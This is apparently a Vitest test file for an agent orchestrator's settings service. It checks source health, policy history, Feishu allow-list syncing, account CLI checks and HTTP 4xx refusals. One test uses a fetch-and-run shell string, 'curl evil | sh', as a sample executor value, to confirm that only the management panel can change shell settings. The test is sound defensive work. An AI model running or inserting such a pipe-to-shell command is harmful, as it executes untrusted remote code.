import { afterEach, beforeEach, expect, expectTypeOf, it, vi } from 'vitest'
import { KV } from '../src/kv.ts'
import { policyVersion, type SettingsOrigin } from '../src/policy.ts'
import { feishuKind } from '../src/sources/feishu.ts'
import { githubKind } from '../src/sources/github.ts'
import { Commands } from '../src/infra/commands.ts'
import { policyHistory } from '../src/app/settings-history.ts'
import { RuntimeHarness, MEMBER, CHAT } from './fixtures/runtime.ts'

let h: RuntimeHarness
beforeEach(async () => {
  h = new RuntimeHarness()
  await h.start()
})
afterEach(async () => {
  await h.stop()
})

it('reports a Source that was switched on as starting until its next pass reports its health', async () => {
  const save = (enabled: boolean) =>
    h.runtime.settings.save(
      'source:github',
      { enabled, config: h.runtime.store.settings().sources.github!.config },
      h.runtime.store.blockRevision('source:github'),
      'panel'
    )
  const github = async () =>
    ((await h.api('GET', 'sources')).body as { id: string; health: unknown[] }[]).find((source) => source.id === 'github')!.health
  await save(false)
  h.runtime.context(githubKind).report('github', { state: 'paused', detail: 'Off', code: 'sourceOff' })
  await save(true)
  expect(await github()).toEqual([{ name: 'github', state: 'starting', detail: '' }])
  // A part that reports something else, such as a missing CLI, keeps its report: no pass may come to replace it.
  await save(false)
  h.runtime.context(githubKind).report('github', { state: 'paused', detail: 'x', code: 'feishuCliUnset' })
  await save(true)
  expect(await github()).toEqual([expect.objectContaining({ code: 'feishuCliUnset' })])
})

it('records each settings save with its policy change and the open tickets told about it', async () => {
  await h.acceptedTicket()
  const settings = h.runtime.store.settings()
  await h.runtime.settings.save('executor', { ...settings.executor, maxWorkers: 5 }, h.runtime.store.blockRevision('executor'), 'panel')
  // What a Source receives is its own configuration, not the Policy; who may originate work there is the Policy's.
  const source = h.runtime.sources.instance('feishu')!
  await h.runtime.settings.save(
    'source:feishu',
    { enabled: true, config: { ...source.config, directMessages: false } },
    h.runtime.store.blockRevision('source:feishu'),
    'panel'
  )
  const policy = h.runtime.store.settings().policy
  await h.runtime.settings.save(
    'policy',
    {
      ...policy,
      sources: {
        ...policy.sources,
        feishu: { ...policy.sources.feishu!, allowed: [...policy.sources.feishu!.allowed, { id: 'ou_bob', name: 'Bob' }] },
      },
    },
    h.runtime.store.blockRevision('policy'),
    'panel'
  )
  await expect(h.runtime.settings.save('executor', settings.executor, 0, 'panel')).rejects.toThrow('Settings changed')
  const history = policyHistory(h.runtime.store, h.runtime.sources, policyVersion(h.runtime.store.settings()))
  expect(history.items.slice(0, 3)).toEqual([
    // Another sender on the list bears on no open ticket, so none is told.
    expect.objectContaining({
      source: 'panel',
      block: 'policy',
      policyChanged: true,
      notified: [],
      changes: [expect.objectContaining({ source: 'feishu', field: 'allowed', part: true })],
    }),
    expect.objectContaining({
      source: 'panel',
      block: 'source:feishu',
      policyChanged: false,
      notified: [],
      changes: [{ code: 'sourceField', source: 'feishu', field: 'directMessages', from: true, to: false }],
    }),
    expect.objectContaining({
      source: 'panel',
      block: 'executor',
      policyChanged: false,
      notified: [],
      changes: [{ code: 'maxWorkers', from: 3, to: 5 }],
    }),
  ])
})

it("syncs a Source's list once its plugin loads after dsh-superagent started", async () => {
  const next = await h.restart()
  await next.ready
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice' }], has_more: false })
  next.sources.register(feishuKind)
  await vi.waitFor(() => expect(next.health['sync:feishu']).toMatchObject({ state: 'ready' }))
})

it('syncs the Feishu part of the Policy from its sync chat in place, and keeps the Policy version when only the order the chat lists changes', async () => {
  const policy = h.runtime.store.settings().policy
  await h.runtime.settings.save(
    'policy',
    {
      ...policy,
      sources: {
        ...policy.sources,
        feishu: {
          allowed: [
            { id: 'ou_bob', name: 'Bob' },
            { id: MEMBER, name: 'Alice' },
          ],
          syncChat: CHAT,
        },
      },
    },
    h.runtime.store.blockRevision('policy'),
    'panel'
  )
  vi.mocked(Commands.prototype.lark).mockResolvedValue({
    users: [
      { member_id: 'ou_erin', name: 'Erin' },
      { member_id: MEMBER, name: 'Alice Liddell' },
    ],
    has_more: false,
  })
  expect(await h.runtime.settings.sync('feishu')).toEqual({
    allowed: [
      { id: MEMBER, name: 'Alice Liddell' },
      { id: 'ou_erin', name: 'Erin' },
    ],
    syncChat: CHAT,
    admission: {},
  })
  expect(h.runtime.store.settings().policy.sources.feishu!.allowed.map((entry) => entry.id)).toEqual([MEMBER, 'ou_erin'])
  expect(h.runtime.health['sync:feishu']).toMatchObject({ state: 'ready', detail: '2 allowed' })
  const version = policyVersion(h.runtime.store.settings())
  vi.mocked(Commands.prototype.lark).mockResolvedValue({
    users: [
      { member_id: MEMBER, name: 'Alice Liddell' },
      { member_id: 'ou_erin', name: 'Erin' },
    ],
    has_more: false,
  })
  await h.runtime.settings.sync('feishu')
  expect(policyVersion(h.runtime.store.settings())).toBe(version)
  await expect(h.runtime.settings.sync('github')).rejects.toThrow('nothing to sync from')
  vi.mocked(Commands.prototype.lark).mockRejectedValue(new Error('rate limited'))
  await expect(h.runtime.settings.sync('feishu')).rejects.toThrow('rate limited')
  expect(h.runtime.health['sync:feishu']).toMatchObject({ state: 'error', detail: expect.stringContaining('rate limited') })
})

it('describes rule edits in the Policy history and skips Policy syncs that change nothing', async () => {
  const settings = h.runtime.store.settings()
  const revision = () => h.runtime.store.get('settings-revision') as number
  const before = revision()
  // The sync chat lists exactly the allowed users already, so nothing is saved.
  await h.runtime.settings.sync('feishu')
  expect(revision()).toBe(before)
  await h.runtime.settings.save(
    'policy',
    {
      ...h.runtime.store.settings().policy,
      rules: [
        { ...settings.policy.rules[0]!, name: '文案' },
        { ...settings.policy.rules[1]!, enabled: false },
        { id: 'docs', name: '文档', enabled: true, instruction: 'x' },
      ],
    },
    h.runtime.store.blockRevision('policy'),
    'panel'
  )
  expect(policyHistory(h.runtime.store, h.runtime.sources, policyVersion(h.runtime.store.settings())).items[0]!.changes).toEqual([
    { code: 'ruleRenamed', from: 'Copy fixes', to: '文案' },
    { code: 'ruleDisabled', name: 'Visual fixes' },
    { code: 'ruleAdded', name: '文档' },
  ])
})

it('records an admission table change in the Policy history as one line for its Source, with a new Policy version', async () => {
  const policy = h.runtime.store.settings().policy
  const version = policyVersion(h.runtime.store.settings())
  await h.runtime.settings.save(
    'policy',
    {
      ...policy,
      sources: { ...policy.sources, feishu: { ...policy.sources.feishu!, admission: { [CHAT]: { unlistedAddressed: 'explicit' } } } },
    },
    h.runtime.store.blockRevision('policy'),
    'panel'
  )
  expect(policyVersion(h.runtime.store.settings())).not.toBe(version)
  expect(policyHistory(h.runtime.store, h.runtime.sources, policyVersion(h.runtime.store.settings())).items[0]!.changes).toEqual([
    { code: 'sourceAdmission', source: 'feishu', part: true },
  ])
})

it('checks only the account a Source save changes, so a problem setup has elsewhere does not refuse it', async () => {
  h.answers = { ...h.answers, [`${h.clis.bot} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await h.restart()
  await next.ready
  expect(next.feishuProblem).toMatchObject({ code: 'feishuUserIdentity' })
  next.sources.register(feishuKind)
  next.sources.register(githubKind)
  h.answers[`${h.clis.other} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] =
    '{"name":"acme/widgets","push":true}\n'
  const github = next.settings.block('source:github')
  const value = github.value as { enabled: boolean; config: Record<string, unknown> }
  expect(
    await next.settings.save('source:github', { ...value, config: { ...value.config, cli: h.clis.other } }, github.revision, 'panel')
  ).toMatchObject({ saved: true, restarting: true })
})

it('lets only the panel change the execution environment, since it decides what runs as a shell command and which CLIs workers reach', async () => {
  const executor = () => h.runtime.store.settings().executor
  const save = (value: Record<string, unknown>, origin: SettingsOrigin) =>
    h.runtime.settings.save('executor', { ...executor(), ...value }, h.runtime.store.blockRevision('executor'), origin)
  for (const origin of ['tool', 'sync'] as const) {
    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }])
      await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
  }
  expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
  expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
  expectTypeOf(h.runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
  expectTypeOf(h.runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
})

it('checks a changed account CLI before saving it, restarts after the save, and lets only the panel change it', async () => {
  const save = (config: Record<string, unknown>, origin: SettingsOrigin = 'panel') =>
    h.runtime.settings.save(
      'source:github',
      { enabled: true, config: { ...h.runtime.store.settings().sources.github!.config, ...config } },
      h.runtime.store.blockRevision('source:github'),
      origin
    )
  await expect(save({ cli: h.clis.other }, 'tool')).rejects.toThrow('can only be changed in the management panel')
  h.answers[`${h.clis.other} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] =
    '{"name":"acme/widgets","push":false}\n'
  await expect(save({ cli: h.clis.other })).rejects.toMatchObject({ code: 'repositoryReadOnly', values: { account: 'agent-bot' } })
  expect(h.restarts).not.toHaveBeenCalled()
  h.answers[`${h.clis.other} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] =
    '{"name":"acme/widgets","push":true}\n'
  expect(await save({ cli: h.clis.other })).toMatchObject({ saved: true, restarting: true })
  await vi.waitFor(() => expect(h.restarts).toHaveBeenCalledTimes(1))
  // Other fields of the Source take effect without a restart.
  expect(await save({ pollSeconds: 120 })).toMatchObject({ saved: true, restarting: false })
  expect(h.restarts).toHaveBeenCalledTimes(1)
  expect(
    (
      await h.runtime.settings.save(
        'executor',
        { ...h.runtime.store.settings().executor, prepare: 'true' },
        h.runtime.store.blockRevision('executor'),
        'panel'
      )
    ).restarting
  ).toBe(false)
  // A save of another block during the account check is kept: the check runs first, then the save merges.
  const pending = save({ cli: h.clis.agent })
  await h.runtime.settings.save(
    'policy',
    { ...h.runtime.store.settings().policy, rules: [] },
    h.runtime.store.blockRevision('policy'),
    'panel'
  )
  await pending
  expect(h.runtime.store.settings().policy.rules).toEqual([])
  expect(h.runtime.store.settings().sources.github!.config).toMatchObject({ cli: h.clis.agent })
  const feishuSave = (cli: string) =>
    h.runtime.settings.save(
      'source:feishu',
      { enabled: true, config: { ...h.runtime.store.settings().sources.feishu!.config, cli } },
      h.runtime.store.blockRevision('source:feishu'),
      'panel'
    )
  expect(await feishuSave('')).toMatchObject({ restarting: true })
  h.answers[`${h.clis.bot} config strict-mode`] = 'strict-mode: off (source: profile)'
  await expect(feishuSave(h.clis.bot)).rejects.toMatchObject({ code: 'feishuUserIdentity', values: { mode: 'off' } })
})

it('pauses and resumes processing as its own action, a setting outside every block, which keeps an Executor settings draft valid', async () => {
  const revision = h.runtime.store.blockRevision('executor')
  expect(await h.runtime.settings.pause(true, 'panel')).toEqual({ paused: true })
  expect(h.runtime.store.settings().paused).toBe(true)
  expect(h.runtime.store.blockRevision('executor')).toBe(revision)
  // A draft of the Executor settings started before the pause still saves, and keeps the pause; the executor block has no pause.
  const draft = h.runtime.store.settings().executor
  await expect(h.runtime.settings.save('executor', { ...draft, paused: false }, revision, 'panel')).rejects.toThrow('paused')
  await h.runtime.settings.save('executor', { ...draft, maxWorkers: 5 }, revision, 'panel')
  expect(h.runtime.store.settings()).toMatchObject({ paused: true, executor: { maxWorkers: 5 } })
  // The orchestrator pauses and resumes the same way, through the settings tool's pause block.
  await h.runTool(h.runtime.masterId, 'orchestrator_settings_save', { block: 'pause', value: { paused: false }, revision: 0 })
  expect(h.runtime.store.settings().paused).toBe(false)
})

it("rereads a Source's display names on request, reports the new ones and keeps the list when the read fails", async () => {
  h.runtime.store.set('source-labels:feishu', { oc_team: 'Team' })
  const lark = vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({
    chats: [
      { chat_id: 'oc_team', name: 'Team' },
      { chat_id: 'oc_new', name: 'New chat' },
    ],
  })
  expect(await h.runtime.settings.refreshLabels('feishu')).toEqual({ added: ['New chat'] })
  expect(lark).toHaveBeenCalledWith(['im', '+chat-list', '--page-all', '--page-size', '100'])
  expect(h.runtime.store.get('source-labels:feishu')).toEqual({ oc_team: 'Team', oc_new: 'New chat' })
  lark.mockRejectedValue(new Error('token expired'))
  await expect(h.runtime.settings.refreshLabels('feishu')).rejects.toThrow('token expired')
  expect(h.runtime.store.get('source-labels:feishu')).toEqual({ oc_team: 'Team', oc_new: 'New chat' })
  await expect(h.runtime.settings.refreshLabels('github')).rejects.toThrow('no names to refresh')
})

it('refuses a settings save with an unknown model or a Source kind that is not installed, an oversized prompt, an unknown revision and a malformed path with 4xx', async () => {
  const request = async (method: string, path: string, body?: unknown) => {
    let status = 0,
      text = ''
    const chunks = body === undefined ? [] : [Buffer.from(JSON.stringify(body))]
    const req = {
      method,
      url: `/orchestrator/api/${path}`,
      headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' },
      async *[Symbol.asyncIterator]() {
        yield* chunks
      },
    }
    await h.http(req, {
      writeHead: (code: number) => {
        status = code
      },
      end: (data: string) => {
        text = data
      },
    })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  vi.mocked(h.services.llm as { resolveCallConfig: ReturnType<typeof vi.fn> }).resolveCallConfig.mockRejectedValueOnce(
    new Error('unknown provider nowhere')
  )
  const evalBlock = { ...h.runtime.store.settings().eval, model: { provider: 'nowhere', model: 'x' } }
  expect(await request('PUT', 'settings/eval', { value: evalBlock, revision: h.runtime.store.blockRevision('eval') })).toMatchObject({
    status: 400,
    body: { code: 'modelUnavailable', values: { block: 'eval', error: 'unknown provider nowhere' } },
  })
  const stored = h.runtime.store.settings()
  h.runtime.store.saveSettings({ ...stored, sources: { ...stored.sources, slack: { enabled: false, config: {} } } })
  expect(await request('PUT', 'settings/source:slack', { value: { enabled: true, config: {} }, revision: 0 })).toMatchObject({
    status: 400,
    body: { code: 'sourceNotInstalled', values: { source: 'slack' } },
  })
  const huge = { ...h.runtime.prompts.current().config, delivery: 'x'.repeat(h.runtime.machine.promptMaxChars.get()) }
  expect(await request('POST', 'prompts/preview', huge)).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  expect(await request('PUT', 'prompts', { config: huge, baseRevision: h.runtime.prompts.current().revision })).toMatchObject({
    status: 400,
    body: { code: 'promptTooLong' },
  })
  // An override of a part this version does not have is refused, not missing.
  expect(
    await request('PUT', 'prompts', {
      config: { ...h.runtime.prompts.current().config, overrides: { 'runtime/nothing': { text: 'x' } } },
      baseRevision: h.runtime.prompts.current().revision,
    })
  ).toMatchObject({ status: 400, body: { code: 'unknownPromptPart' } })
  expect(await request('GET', 'prompts?revision=99')).toMatchObject({ status: 404, body: { code: 'unknownPromptRevision' } })
  expect(await request('GET', 'threads/%E0%A4%A')).toEqual({ status: 400, body: { error: 'A path segment has a malformed escape' } })
})

it("shows the settings history when one revision holds values its Source kind no longer accepts, without that revision's changes", async () => {
  const settings = h.runtime.store.settings()
  await h.runtime.settings.save('executor', { ...settings.executor, maxWorkers: 4 }, h.runtime.store.blockRevision('executor'), 'panel')
  await h.runtime.settings.save(
    'executor',
    { ...h.runtime.store.settings().executor, maxWorkers: 5 },
    h.runtime.store.blockRevision('executor'),
    'panel'
  )
  // A revision the migration left as an earlier version wrote it, which the Feishu kind's schema rejects.
  const revision = h.runtime.store.get(KV.settings.revision)!
  const stored = h.runtime.store.get(KV.settings.version(revision - 1))!
  h.runtime.store.set(KV.settings.version(revision - 1), {
    ...stored,
    settings: { ...stored.settings, sources: { ...stored.settings.sources, feishu: { enabled: true, config: { readPageSize: 'many' } } } },
  })
  const history = policyHistory(h.runtime.store, h.runtime.sources, policyVersion(h.runtime.store.settings()))
  expect(history.items.slice(0, 2)).toEqual([
    expect.objectContaining({ revision, changes: null }),
    expect.objectContaining({ revision: revision - 1, changes: null }),
  ])
  expect(history.items[2]).toMatchObject({ revision: revision - 2 })
})
